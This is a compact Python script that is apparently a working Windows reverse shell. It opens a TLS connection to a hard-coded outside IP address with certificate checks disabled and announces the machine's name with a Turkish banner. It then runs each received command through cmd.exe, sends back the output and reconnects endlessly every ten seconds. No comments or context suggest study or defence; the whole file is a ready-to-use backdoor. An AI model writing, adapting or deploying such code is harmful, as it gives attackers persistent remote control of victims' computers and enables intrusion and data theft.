import socket,ssl,subprocess,os,time; h='185.194.175.132'; p=7000;
while True:
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.setsockopt(socket.SOL_SOCKET,socket.SO_KEEPALIVE,1);
  ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE;
  ssls=ctx.wrap_socket(s,server_hostname='lab-manager'); ssls.connect((h,p));
  ssls.send(f'--- Cihaz Baglandi: {os.environ.get("COMPUTERNAME","PC")} ---\n'.encode());
  while True:
   d=ssls.recv(4096).decode('utf-8','ignore').strip();
   if not d or d=='exit': break
   pr=subprocess.Popen(f'cmd.exe /c {d}',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);
   st,er=pr.communicate(); ssls.send(st+er+b'\nSHELL> ');
 except: time.sleep(10);
 finally:
  try: s.close();
  except: pass
